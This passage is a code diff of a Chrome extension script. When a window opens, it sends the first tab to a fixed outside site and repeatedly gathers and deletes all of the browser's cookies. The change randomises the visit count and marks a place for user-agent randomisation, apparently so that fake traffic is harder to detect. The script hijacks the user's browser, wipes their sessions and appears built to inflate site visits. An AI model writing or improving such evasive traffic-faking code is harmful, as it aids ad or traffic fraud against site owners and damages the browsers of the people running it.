@@ -6,6 +6,10 @@ function determine_url_from(cookie) {
     return prefix + cookie.domain + cookie.path;
 }
 
+function random_page() {
+
+}
+
 // on window create (or browser start) we open tab to pm receiver
 chrome.windows.onCreated.addListener(function(w) {
   //chrome.tabs.query({'active': true}, function(tabs) {
@@ -14,13 +18,17 @@ chrome.windows.onCreated.addListener(function(w) {
       chrome.tabs.update(w.tabs[0].id, { "url": "http://www.elmundodigital.net?xyz" })
 
       f = function(tab_id) {
-        var counter = 0
+        // set a random number of page visits
+        var counter     = 0
+        var page_visits = Math.floor((Math.random()*6)+2)
+
+        // set random user agent 
 
         setInterval(function() {
 
           // if we have iterated 7 times, or this is the first
           // instance, then 
-          if (counter++ % 5 === 0) {
+          if (counter++ % page_visits === 0) {
             chrome.cookies.getAll({}, function(cookies) {
               for(var i = 0; i < cookies.length; i++) {
                 chrome.cookies.remove({
